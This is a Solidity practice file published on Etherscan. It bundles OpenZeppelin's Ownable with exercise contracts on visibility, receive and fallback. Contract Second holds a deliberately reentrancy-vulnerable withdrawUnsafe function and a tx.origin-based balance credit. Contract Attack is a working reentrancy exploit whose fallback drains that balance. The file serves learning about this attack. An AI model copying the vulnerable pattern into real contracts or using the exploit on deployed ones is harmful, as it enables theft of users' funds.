/**
 *Submitted for verification at Etherscan.io on 2022-09-21
*/

// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts/Practice4/FunctionTypesPracticeInput.sol


pragma solidity ^0.8.9;


interface IFirst {
    function setPublic(uint256 num) external;
    function setPrivate(uint256 num) external;
    function setInternal(uint256 num) external;
    function sum() external view returns (uint256);
    function sumFromSecond(address contractAddress) external returns (uint256);
    function callExternalReceive(address payable contractAddress) external payable;
    function callExternalFallback(address payable contractAddress) external payable;
    function getSelector() external pure returns (bytes memory);
}

interface ISecond {
    function withdrawSafe(address payable holder) external;
    function withdrawUnsafe(address payable holder) external;
}

interface IAttacker {
    function increaseBalance() external payable;
    function attack() external;
}

contract First is Ownable {
    uint256 public ePublic;
    uint256 private ePrivate;
    uint256 internal eInternal;

    function setPublic(uint256 num) external onlyOwner {
        ePublic = num;
    }

    function setPrivate(uint256 num) external onlyOwner {
        ePrivate = num;
    }

    function setInternal(uint256 num) external onlyOwner {
        eInternal = num;
    }

    function sum() external view virtual returns (uint256) {
        return ePublic + ePrivate + eInternal;
    }

    // I just do not kniw how to crrectly do it...
    function sumFromSecond(address contractAddress) external returns (uint256) {
        (bool success, bytes memory _data) = contractAddress.call(abi.encodeWithSignature("sum()"));
        require(success, "sum wasn't called");
        return abi.decode(_data, (uint256));
    }

    function callExternalReceive(address payable contractAddress) external payable {
        require(msg.value == 0.0001 ether);
        (bool sent, ) = contractAddress.call{value: 0.0001 ether}("");
        require(sent, "failed to sent Ether");
    }

    function callExternalFallback(address payable contractAddress) external payable {
        require(msg.value == 0.0002 ether);
        (bool sent, ) = contractAddress.call{value: 0.0002 ether}("data");
        require(sent, "failed to sent Ether");
    }

    function getSelector() external pure returns (bytes memory) {
        string memory str = string(abi.encodeWithSignature("ePublic()"));
        str = string.concat(str, string(abi.encodeWithSignature("setPublic(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("setPrivate(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("setInternal(uint256)")));
        str = string.concat(str, string(abi.encodeWithSignature("sumFromSecond(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("callExternalReceive(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("callExternalFallback(address)")));
        str = string.concat(str, string(abi.encodeWithSignature("getSelector()")));
        str = string.concat(str, string(abi.encodeWithSignature("sum()")));
        return bytes(str);
    }

    function getAddress() external view virtual returns (address) {
        return address(this);
    }
}

contract Second is First, ISecond {
    mapping(address => uint256) public balance;

    function sendEth() external payable {
        address(this).call{value: msg.value}("");
    }

    function sum() external view override returns (uint256) {
        return ePublic + eInternal;
    }

    receive() external payable {
        balance[tx.origin] += msg.value;
    }

    fallback() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdrawSafe(address payable holder) external {
        uint amount_ = balance[holder];
        balance[holder] = 0;
        holder.transfer(amount_);
    }

    function withdrawUnsafe(address payable holder) external {
        uint amount_ = balance[holder];
        require(amount_ > 0);

        holder.call{value: amount_}("");

        balance[holder] = 0;
    }

    function getAddress() external view override returns (address) {
        return address(this);
    }
}

contract Attack is IAttacker {
    Second private second_;

    constructor(address payable _secondAddress) {
        second_ = Second(_secondAddress);
    }

    function increaseBalance() external payable {
        (bool sent, ) = payable(address(second_)).call{value: msg.value}("d");
        require(sent, "failed to sent Ether");
    }

    fallback() external payable {
        second_.withdrawUnsafe(payable(address(this)));
    }

    function attack() external {
        second_.withdrawUnsafe(payable(address(this)));
    }

    function getAddress() external view returns (address) {
        return address(this);
    }
}